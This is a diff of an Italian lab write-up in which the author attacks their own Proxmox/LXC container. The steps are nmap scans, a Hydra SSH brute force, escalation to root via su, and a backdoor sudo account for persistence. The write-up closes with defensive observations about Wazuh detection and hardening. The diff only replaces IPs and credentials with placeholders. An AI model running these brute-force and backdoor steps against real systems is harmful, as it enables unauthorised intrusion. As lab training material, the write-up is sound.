@@ -18,9 +18,9 @@ Il mio obiettivo è trovare gli host attivi, identificare un bersaglio e ottener
 ```mermaid
 flowchart TD
     A([cs20 - Kali Linux]) -->|nmap -sn| B[Scopro gli host in rete]
-    B -->|nmap -sV 192.168.1.133| C[Porta 22 SSH aperta su cs33]
-    C -->|Hydra brute force| D[Credenziali trovate: swagvict / victim]
-    D -->|ssh swagvict@cs33| E[Dentro cs33 come swagvict]
+    B -->|nmap -sV 192.capy.1.capy| C[Porta 22 SSH aperta su cs33]
+    C -->|Hydra brute force| D[Credenziali trovate: [capybara-priv] / [capybara-priv]]
+    D -->|ssh [capybara-priv]@cs33| E[Dentro cs33 come [capybara-priv]]
     E -->|ricerca binari SUID| F[su - → shell root]
     F -->|useradd backdoor| G[Utente backdoor creato]
     G -->|ssh backdoor@cs33| H[Accesso persistente stabilito]
@@ -40,17 +40,17 @@ flowchart TD
 ### 1. Scansione rete - scopro gli host attivi
 
 ```bash
-nmap -sn 192.168.1.0/24
+nmap -sn 192.capy.1.capy/24
 ```
 
 Mostra tutti i dispositivi attivi in rete.
 
-Dalla scansione appaiono più dispositivi Proxmox (prefisso MAC `BC:24:11`). Poiché cs33 è un container LXC, non appare con un hostname - lo identifico tramite l'host Proxmox (`pct exec 33 -- ip a`), che conferma che cs33 è a `192.168.1.133`.
+Dalla scansione appaiono più dispositivi Proxmox (prefisso MAC `BC:24:11`). Poiché cs33 è un container LXC, non appare con un hostname - lo identifico tramite l'host Proxmox (`pct exec 33 -- ip a`), che conferma che cs33 è a `192.capy.1.capy`.
 
 ### 2. Scansione porte - trovo i servizi aperti sul bersaglio
 
 ```bash
-nmap -sV 192.168.1.133
+nmap -sV 192.capy.1.capy
 ```
 
 La porta 22 (SSH) è aperta - in esecuzione OpenSSH 8.9p1 su Ubuntu. Il bersaglio è vulnerabile al brute force.
@@ -60,19 +60,19 @@ La porta 22 (SSH) è aperta - in esecuzione OpenSSH 8.9p1 su Ubuntu. Il bersagli
 > In uno scenario reale userei la wordlist completa `rockyou.txt` (14M password). Qui ho usato una lista corta per velocità.
 
 ```bash
-hydra -l swagvict -P /tmp/test-passwords.txt -t 4 -V ssh://192.168.1.133
+hydra -l [capybara-priv] -P /tmp/test-passwords.txt -t 4 -V ssh://192.capy.1.capy
 ```
 
 Hydra ha trovato le credenziali:
 ```
-[22][ssh] host: 192.168.1.133   login: swagvict   password: victim
+[22][ssh] host: 192.capy.1.capy   login: [capybara-priv]   password: [capybara-priv]
 1 of 1 target successfully completed, 1 valid password found
 ```
 
 ### 4. Login con la password trovata
 
 ```bash
-ssh swagvict@192.168.1.133
+ssh [capybara-priv]@192.capy.1.capy
 ```
 
 ---
@@ -101,10 +101,10 @@ passwd backdoor
 usermod -aG sudo backdoor
 ```
 
-Da cs20 ho ora accesso persistente anche se `swagvict` venisse eliminato:
+Da cs20 ho ora accesso persistente anche se `[capybara-priv]` venisse eliminato:
 
 ```bash
-ssh backdoor@192.168.1.133
+ssh backdoor@192.capy.1.capy
 ```
 
 ---
@@ -135,7 +135,7 @@ cs55 ha rilevato anche:
 
 ## Osservazioni AI
 
-- **Password debole su un utente critico:** `swagvict` aveva password `victim` - craccata in istanti. In un ambiente reale servono policy sulle password e blocco account dopo N tentativi falliti.
+- **Password debole su un utente critico:** `[capybara-priv]` aveva password `[capybara-priv]` - craccata in istanti. In un ambiente reale servono policy sulle password e blocco account dopo N tentativi falliti.
 - **Password root accessibile via `su`:** la privilege escalation è stata banale. `su` dovrebbe essere limitato o la password root disabilitata, usando `sudo` con regole per utente.
 - **I container LXC non sono isolati a livello rete:** cs33 era raggiungibile da tutta la LAN senza regole firewall. Un setup sicuro limiterebbe SSH agli IP fidati.
 - **Wazuh ha rilevato tutto ma non ha bloccato niente:** in questa configurazione Wazuh è passivo (solo SIEM). Per bloccare attivamente serve configurare `active-response` - es. ban automatico IP dopo X tentativi SSH falliti.
